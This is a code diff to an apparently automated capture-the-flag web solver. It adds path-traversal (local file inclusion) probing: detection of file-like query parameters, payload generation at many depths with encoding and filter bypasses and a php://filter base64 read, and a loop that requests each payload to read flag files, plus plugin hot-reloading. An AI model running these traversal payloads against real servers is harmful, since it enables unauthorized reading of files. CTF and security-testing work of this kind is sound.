@@ -95,18 +95,143 @@ def concept_handlers(key, clues):
     return out
 
 
-def _routes(clues, base):
-    """Every path the kit names in /api/clues, plus links scraped from the home page as a fallback."""
+def _named_routes(clues):
     j = clues if isinstance(clues, dict) else {}
     routes = [v for v in j.values() if isinstance(v, str) and re.fullmatch(r"/[\w./-]+", v)]
     for v in j.values():
         if isinstance(v, list):
             routes += [x for x in v if isinstance(x, str) and x.startswith("/")]
+    return routes
+
+
+def _routes(clues, base, home=None):
+    """Every path the kit names in /api/clues, plus links scraped from the home page as a fallback (`home`: an already
+    fetched home body). A query-bearing link counts by its path (D28: `/reader.php?doc=start.php` was dropped whole);
+    the link itself, with its parameter, is _query_links' (the ladder's step 0)."""
+    routes = _named_routes(clues)
     if not routes:
-        _, home, _ = websolve.fetch(base)
-        routes = [r for r in re.findall(r'href="(/[^"#?]+)"', home)
+        if home is None:
+            _, home, _ = websolve.fetch(base)
+        routes = [r for r in re.findall(r'href="(/[^"#?]+)[^"#]*"', home or "")
                   if not r.startswith(("/assets", "/api/clues"))]
     return list(dict.fromkeys(routes))
+
+
+_LINK_RE = re.compile(r"""(?:href|src|action)\s*=\s*["'](/[^"'#]*\?[^"'#]+)["']""", re.I)
+
+
+def _query_links(html):
+    """[(path, param, value)] for every same-origin link / form action on a page that carries a query string, in page
+    order, one per (path, param). D28 Target 4 (the compounded Day-20 viewer, no /api/clues): its ONLY routes were
+    `/reader.php?doc=<page>.php` links, which _routes dropped -- so the ladder reached `doc` after ~100 requests."""
+    out, seen = [], set()
+    for href in _LINK_RE.findall(html or ""):
+        u = urllib.parse.urlsplit(href.replace("&amp;", "&"))
+        if u.path.startswith(("/assets", "/api/clues")):
+            continue
+        for k, v in urllib.parse.parse_qsl(u.query, keep_blank_values=True):
+            if (u.path, k) not in seen:
+                seen.add((u.path, k))
+                out.append((u.path or "/", k, v))
+    return out
+
+
+# ---- clue-less path traversal (lane-day 04 "Stay in Your Directory", compounded into D27/D28 Masteries) -------------
+# File-ish parameter names a viewer / include page takes (the kit's was `doc`; generalized).
+LFI_PARAMS = ("doc", "document", "file", "filename", "page", "path", "name", "view", "template", "tpl", "include",
+              "inc", "load", "read", "show", "content", "lang", "dir", "folder")
+# Where this event mounts the attempt proof (every LFI prompt so far named /run/huntress/objective.txt; a compounded
+# Mastery target's prompt is ANOTHER challenge's and names nothing), then the classic fallbacks.
+LFI_TARGETS = ("/run/huntress/objective.txt", "/flag.txt", "/flag")
+# Traversal depth, deepest first: include() clamps extra `../` at `/`, so a deep one lands from any base dir (D28:
+# reader.php's base /var/www/html/pages/ took >= 4, the breach target was read at 9); 1..8 cover an app that caps it.
+LFI_DEPTHS = (9, 10, 5, 6, 7, 8, 4, 3, 2, 1)
+_FILEISH = re.compile(r"/|\.(?:php\d?|phtml|html?|txt|md|inc|tpl|twig|ejs|hbs|j2|jinja2?|xml|json|ya?ml|cfg|conf|ini|"
+                      r"log|csv)$", re.I)
+_VIEWER_PAGE = re.compile(r"^/(?:[\w-]+/)*(?:read(?:er)?|notes?|view(?:er)?|docs?|document|pages?|files?|include|"
+                          r"download|show|runbooks?|handbook|help)\.(?:php\d?|phtml|asp|aspx|jsp)$", re.I)
+
+
+def lfi_param(param, value=""):
+    """A query parameter that looks like it names a file: an LFI_PARAMS name, or a value shaped like a path/file."""
+    return str(param).lower() in LFI_PARAMS or bool(_FILEISH.search(value or ""))
+
+
+def lfi_fingerprint(html):
+    """Clue-less LFI fingerprint of a home page -> [(path, param, value)] candidates ([] = not this class): a link whose
+    query parameter names a file (`?doc=start.php`, `?file=`, `?page=`, ...), a GET form with such an input, or a viewer
+    page (reader.php / notes.php ...) whose parameter we then guess. lib.web.solve_target treats a hit as a KNOWN class
+    (adequate budget, the traversal probe raced first) instead of the 12 s unknown-key cap that missed D27/D28 Target 4."""
+    html = html or ""
+    out = [(p, k, v) for p, k, v in _query_links(html) if lfi_param(k, v)]
+    for method, action, fields, _choices in _forms(html):
+        path = urllib.parse.urlsplit(action or "").path
+        if method == "get" and path.startswith("/"):
+            out += [(path, k, v) for k, v in fields.items() if str(k).lower() in LFI_PARAMS]
+    have = {p for p, _k, _v in out}
+    for page in re.findall(r"""(?:href|action)\s*=\s*["'](/[^"'#?]+)""", html, re.I):
+        if page not in have and _VIEWER_PAGE.search(page):
+            have.add(page)
+            out += [(page, k, "") for k in ("doc", "file", "page", "path")]
+    return list(dict.fromkeys(out))
+
+
+def traversal_values(target, value=""):
+    """URL-encoded parameter values that read absolute `target` through a traversal: plain `../` at every LFI_DEPTHS
+    depth first (one request on the D28 kit), then the absolute path, the link's own directory prefix + traversal, the
+    filter bypasses (non-recursive strip, encoded / double-encoded slash, backslash) and a php://filter base64 read."""
+    rel = target.lstrip("/")
+    q = lambda s: urllib.parse.quote(s, safe="/")  # noqa: E731
+    out = [q("../" * d + rel) for d in LFI_DEPTHS] + [q(target)]
+    prefix = value.rsplit("/", 1)[0] + "/" if "/" in (value or "").strip("/") else ""
+    if prefix:
+        out += [q(prefix + "../" * d + rel) for d in LFI_DEPTHS[:2]]
+    for d in (9, 5):
+        out += [q("....//" * d + rel), "..%2f" * d + q(rel), "%2e%2e%2f" * d + q(rel), "..%252f" * d + q(rel),
+                "..%5c" * d + q(rel)]
+    out.append(q("php://filter/convert.base64-encode/resource=" + target))
+    return list(dict.fromkeys(out))
+
+
+def lfi_proof(body):
+    """proof_<hex> in a traversal response: as-is, or inside a base64 blob (a php://filter read)."""
+    p = websolve.proof(body)
+    if p:
+        return p
+    import base64
+    for b in re.findall(r"[A-Za-z0-9+/]{16,}={0,2}", body or ""):
+        try:
+            p = websolve.proof(base64.b64decode(b + "=" * (-len(b) % 4)).decode("utf-8", "replace"))
+        except ValueError:
+            continue
+        if p:
+            return p
+    return None
+
+
+def _with_param(url, param, value):
+    """`url` with `param` set to the already-encoded `value` (other query params of the link kept)."""
+    u = urllib.parse.urlsplit(url)
+    qs = [f"{urllib.parse.quote(k)}={urllib.parse.quote(v)}" for k, v in urllib.parse.parse_qsl(u.query, True)
+          if k != param]
+    return urllib.parse.urlunsplit(u._replace(query="&".join(qs + [f"{urllib.parse.quote(param)}={value}"])))
+
+
+def lfi(base, clues, home=None):
+    """Clue-less path traversal (the Day-20 lane-day 04 viewer, D27/D28 Mastery Target 4): for every fingerprinted
+    (page, file parameter) read LFI_TARGETS through traversal_values. ~1 request when the kit is the known one; <= ~25
+    per (page, param) per target otherwise. `home`: the already fetched home body (lib.web.solve_target passes it)."""
+    if home is None:
+        _, home, _ = websolve.fetch(base)
+    cands = lfi_fingerprint(home)
+    for target in LFI_TARGETS:
+        for path, param, value in cands:
+            url = urllib.parse.urljoin(base, path)
+            for v in traversal_values(target, value):
+                p = lfi_proof(websolve.fetch(_with_param(url, param, v))[1])
+                if p:
+                    return p
+    return None
 
 
 def session_fixation(base, clues):
@@ -176,7 +301,21 @@ def default(base, clues):
     Ladder: (1) GET every named route as-is; (2) role escalation (present privileged role cookies/headers);
     (3) parameter tampering (IDOR / LFI / SSRF / SQLi) on the named routes. First proof_<hex> wins."""
     j = clues if isinstance(clues, dict) else {}
-    routes = _routes(j, base)
+    home = None
+    if not _named_routes(j):
+        _, home, _ = websolve.fetch(base)
+    routes = _routes(j, base, home)
+
+    # 0) clue-less app: its query-bearing links, each with ITS OWN parameter's payloads first (D28 Target 4: the
+    #    `doc` viewer link was the only way in, reached only after ~100 role/param probes on the bare paths)
+    for path, param, value in _query_links(home):
+        url = urllib.parse.urljoin(base, path)
+        vals = traversal_values(LFI_TARGETS[0], value) if lfi_param(param, value) else []
+        vals += [urllib.parse.quote(v, safe="/") for v in _PARAM_PAYLOADS.get(param, [])]
+        for v in dict.fromkeys(vals):
+            p = lfi_proof(websolve.fetch(_with_param(url, param, v))[1])
+            if p:
+                return p
 
     # 1) every named route as the current role
     for r in routes:
@@ -389,45 +528,134 @@ _HANDLERS = {
 }
 
 
-def _load_plugins():
+# D28 TT: the codify plugin landed in this directory MID-ATTEMPT, but plugins loaded once at import, so the long-lived
+# process's in-process retries (orchestrator / warm daemon / miss-retry passes) never raced it. refresh() re-scans the
+# directory (a listing + one stat per file, ~1 ms) and loads new / changed plugins, unloading deleted ones; lib.web calls
+# it before every target race and every retry pass. HCTF_WEB_HOT_RELOAD=0 = load once at import (the old behaviour).
+HOT_RELOAD = __import__("os").environ.get("HCTF_WEB_HOT_RELOAD", "1") != "0"
+GENERATION = 0      # bumped on every plugin (re)load / unload: a race older than this ran without the newest plugin
+_SEEN = {}          # plugin path -> (mtime_ns, size, module) at its last load attempt (a failed one too: retried on change)
+_REFRESH_LOCK = __import__("threading").Lock()
+_MOD_REG = {}       # module name -> [(pattern, handler name)] it registered (so a reload / delete can unregister them)
+_OWNER = {}         # handler name -> module name that registered it (a reloaded plugin may replace its own handler)
+
+
+def _plugin_files():
+    """[(module name, path)] of every plugin file: per-day plugins first (a day's own handler keeps its place in the
+    race order), then the off-peak prebuild's generic ones (D25 D5)."""
+    from pathlib import Path
+    here = Path(__file__).parent
+    mods = [(f"{__name__}.{p.stem}", p) for p in sorted(here.glob("*.py"))]
+    mods += [(f"{__name__}.prebuilt.{p.stem}", p) for p in sorted((here / "prebuilt").glob("*.py"))]
+    return [(m, p) for m, p in mods if not p.name.startswith("_")]
+
+
+def _unregister(modname):
+    for pat, name in _MOD_REG.pop(modname, []):
+        if (pat, name) in _KEY_MAP:
+            _KEY_MAP.remove((pat, name))
+        _COMPANIONS.pop((pat, name), None)
+    for name in [n for n, m in _OWNER.items() if m == modname]:
+        _OWNER.pop(name)
+        _HANDLERS.pop(name, None)
+        _RUN_ALONE.discard(name)
+
+
+def _load_one(modname, p):
+    import importlib
+    import sys
+    reloading = modname in _MOD_REG or modname in sys.modules
+    if reloading:
+        _unregister(modname)
+        sys.modules.pop(modname, None)
+    mod = importlib.import_module(modname)
+    hs = dict(getattr(mod, "HANDLERS", None) or {})
+    comp = dict(getattr(mod, "KEY_COMPANIONS", None) or {})
+    ra = getattr(mod, "RUN_ALONE", False)   # True = every handler this plugin registers; or a list of names
+    ra_names = set(hs) if ra is True else {n for n in (ra or []) if isinstance(n, str)}
+    reg = _MOD_REG.setdefault(modname, [])
+    for pat, name in list(getattr(mod, "KEY_MAP", None) or []):
+        # a built-in keeps its name; the same plugin may map several clue-key patterns to one handler
+        if name in hs and callable(hs[name]) and _HANDLERS.get(name, hs[name]) is hs[name]:
+            re.compile(pat)
+            _HANDLERS[name] = hs[name]
+            _OWNER.setdefault(name, modname)
+            if (pat, name) not in _KEY_MAP:
+                _KEY_MAP.append((pat, name))
+                reg.append((pat, name))
+            if comp.get(pat):
+                re.compile(comp[pat])
+                _COMPANIONS[(pat, name)] = comp[pat]
+            if name in ra_names:
+                _RUN_ALONE.add(name)
+
+
+def _load_plugins(files=None):
     """Per-class plugin modules next to this file (`lib/web/handlers/<slug>.py`), each with KEY_MAP = [(clue-key regex,
     name)] and HANDLERS = {name: fn(base, clues) -> proof or None} (optional KEY_COMPANIONS = {regex: companion-key
     regex}: that pattern only dispatches when a companion clue key is present). The web codify worker writes one IN-RUN the moment
     a new class is cracked (D22 post-mortem #8/#9): this run's Mastery -- whose 3 targets put today's class on ANY slot --
-    and every later day's compounded targets pick it up at import, with no adoption step and no lost update between two
-    web chains editing this file at once. A broken plugin is skipped, never fatal. The ratchet may fold it in here."""
-    import importlib
+    and every later day's compounded targets pick it up at import (or at the next refresh() in a long-lived process),
+    with no adoption step and no lost update between two web chains editing this file at once. A broken plugin is
+    skipped, never fatal. The ratchet may fold it in here. `files`: [(module name, path)] to (re)load (default all).
+    Returns how many plugins were (re)loaded."""
     import sys
-    from pathlib import Path
-    here = Path(__file__).parent
-    # D25 D5: + the off-peak web prebuild's generic class handlers (lib/web/handlers/prebuilt/prebuilt_<id>.py, gated
-    # offline on recorded-kit fixtures by tests/test_web_fixtures.py); per-day plugins first, so a day's own handler
-    # keeps its place in the race order
-    mods = [(f"{__name__}.{p.stem}", p) for p in sorted(here.glob("*.py"))]
-    mods += [(f"{__name__}.prebuilt.{p.stem}", p) for p in sorted((here / "prebuilt").glob("*.py"))]
-    for modname, p in mods:
-        if p.name.startswith("_"):
-            continue
+    global GENERATION
+    n = 0
+    for modname, p in (_plugin_files() if files is None else files):
         try:
-            mod = importlib.import_module(modname)
-            hs = dict(getattr(mod, "HANDLERS", None) or {})
-            comp = dict(getattr(mod, "KEY_COMPANIONS", None) or {})
-            ra = getattr(mod, "RUN_ALONE", False)   # True = every handler this plugin registers; or a list of names
-            ra_names = set(hs) if ra is True else {n for n in (ra or []) if isinstance(n, str)}
-            for pat, name in list(getattr(mod, "KEY_MAP", None) or []):
-                # a built-in keeps its name; the same plugin may map several clue-key patterns to one handler
-                if name in hs and callable(hs[name]) and _HANDLERS.get(name, hs[name]) is hs[name]:
-                    re.compile(pat)
-                    _HANDLERS[name] = hs[name]
-                    if (pat, name) not in _KEY_MAP:
-                        _KEY_MAP.append((pat, name))
-                    if comp.get(pat):
-                        re.compile(comp[pat])
-                        _COMPANIONS[(pat, name)] = comp[pat]
-                    if name in ra_names:
-                        _RUN_ALONE.add(name)
+            st = p.stat()
+            _SEEN[p] = (st.st_mtime_ns, st.st_size, modname)
+        except OSError:
+            continue
+        n += 1
+        try:
+            _load_one(modname, p)
         except Exception as e:  # noqa: BLE001 - one bad plugin must not sink the dispatch
             print(f"web handler plugin {p.name}: {e!r}", file=sys.stderr)
+    GENERATION += n
+    return n
+
+
+def refresh():
+    """Load plugin files that appeared or changed since the last scan and unload deleted ones (HOT_RELOAD). True when
+    anything changed. Cheap enough for every race: one directory listing + one stat per plugin. Never raises."""
+    if not HOT_RELOAD:
+        return False
+    with _REFRESH_LOCK:
+        return _refresh()
+
+
+def _refresh():
+    global GENERATION
+    try:
+        files = _plugin_files()
+        present = {p for _m, p in files}
+        gone = [p for p in _SEEN if p not in present]
+        todo = []
+        for modname, p in files:
+            try:
+                st = p.stat()
+            except OSError:
+                continue
+            if _SEEN.get(p, ())[:2] != (st.st_mtime_ns, st.st_size):
+                todo.append((modname, p))
+        if not todo and not gone:
+            return False
+        import importlib
+        import sys
+        for p in gone:
+            modname = _SEEN.pop(p)[2]
+            _unregister(modname)
+            sys.modules.pop(modname, None)
+            GENERATION += 1
+        importlib.invalidate_caches()   # the import system's directory cache predates a file written mid-run
+        _load_plugins(todo)
+        return True
+    except Exception as e:  # noqa: BLE001 - a hot-reload hiccup must never sink a race
+        import sys
+        print(f"web handler refresh: {e!r}", file=sys.stderr)
+        return False
 
 
 _load_plugins()
